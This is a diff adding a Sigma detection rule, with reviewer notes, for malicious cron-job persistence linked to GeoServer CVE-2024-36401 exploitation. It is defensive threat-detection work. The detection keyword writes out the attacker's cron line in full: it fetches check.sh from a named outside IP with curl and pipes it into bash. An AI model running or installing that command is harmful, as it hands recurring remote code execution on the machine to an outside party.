@@ -1,0 +1,29 @@
+# review_report_url: Threat Actors Exploit GeoServer Vulnerability CVE-2024-36401 | FortiGuard Labs (fortinet.com)
+# review_date: 2024-10-08
+# review_author: Blackpearl
+# review_rule_useful: true
+# review_rule_classification: proceed to testing
+# review_rule_classification_reason: na
+# review_rule_ttp_match: yes
+# review_notes:
+#  - This Sigma rule aims to detect the creation of a malicious cron job that periodically executes a script downloaded from a known malicious IP address. The rule is highly relevant to the threat described in the CTI report, accurately capturing the specific cron job syntax used by the attacker.The detection key uses a 'keywords' field, which is appropriate for searching within cron job entries.The rule correctly identifies the IOC (malicious IP 112.133.194.254) from the CTI report. While this specificity reduces false positive
+title: Detection of Malicious Cron Job Creation
+id: 6bbafd17-0332-4200-a44b-83bd499d7146
+status: experimental
+description: Detects the creation of a cron job within "cron.sh" to periodically execute "check.sh" from a known malicious IP address.
+references:
+  - https://www.fortinet.com/blog/threat-research/threat-actors-exploit-geoserver-vulnerability-cve-2024-36401
+author: System Two Security
+date: 2024/09/20
+tags:
+  - attack.persistence
+logsource:
+  product: linux
+  service: cron
+detection:
+  selection:
+    keywords: '*/30 * * * * curl -s http://112.133.194.254/check.sh | bash'
+  condition: selection
+falsepositives:
+  - Legitimate administrative activity that involves scheduling similar cron jobs.
+level: high
